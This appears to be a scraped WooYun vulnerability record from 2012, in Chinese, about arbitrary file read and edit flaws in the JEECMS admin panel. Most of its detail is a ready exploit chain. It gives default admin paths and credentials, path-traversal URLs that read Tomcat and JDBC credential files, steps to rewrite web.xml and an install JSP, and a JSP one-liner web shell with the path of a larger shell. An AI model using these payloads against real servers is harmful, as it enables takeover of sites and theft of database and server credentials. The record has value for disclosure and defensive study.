{"id": 21510, "wybug_id": "wooyun-2012-04030", "wybug_title": "JEECMS后台任意文件编辑漏洞and官方漏洞及拿shell", "wybug_corp": "JEECMS", "wybug_author": "随风.潜入夜", "wybug_date": "2012-01-27 12:22", "wybug_open_date": "2012-01-27 12:22", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "默认后台", "默认密码", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-01-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-01-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： JEECMS后台任意文件编辑漏洞以及官方的demo站、官方服务器安全问题 详细说明：  2.x后台：login/Jeecms.do3.x后台：jeeadmin/jeecms/index.do默认账户：admin默认密码：password获取tomcat密码：/jeeadmin/jeecms/template/v_edit.do?root=../../conf/&name=../../conf/tomcat-users.xml获取JDBC数据库账号密码：/jeeadmin/jeecms/template/v_edit.do?root=%2FWEB-INF%2Fconfig%2F&name=%2FWEB-INF%2Fconfig%2Fjdbc.propertiesJEECMS2.x版读取路径：admin/core/template/Com_edit.do?relPath=\\../../../classes/jdbc.properties修改web.xml取消对jsp的过滤：/jeeadmin/jeecms/template/v_edit.do?root=%2FWEB-INF%2F&name=%2FWEB-INF%2Fweb.xmlJEECMS2.x版读取路径：admin/core/template/Com_edit.do?relPath=\\../../../web.xml修改install/install_setup.jsp：/jeeadmin/jeecms/template/v_edit.do?root=%2Finstall%2F&name=%2Finstall%2Finstall_setup.jspJEECMS2.x版读取路径：admin/core/template/Com_edit.do?relPath=\\../../../../install\\install_setup.jsp插入Jsp一句话：<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>修改后的一句话目录/install/install_setup.jsp一句话连接成功后的jsp大马目录：/ma.jsp   漏洞证明：  \n\n\n\n\n\n   修复方案：  修复：还是先修复下官方服务器吧、你懂的   版权声明：转载请注明来源 随风.潜入夜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}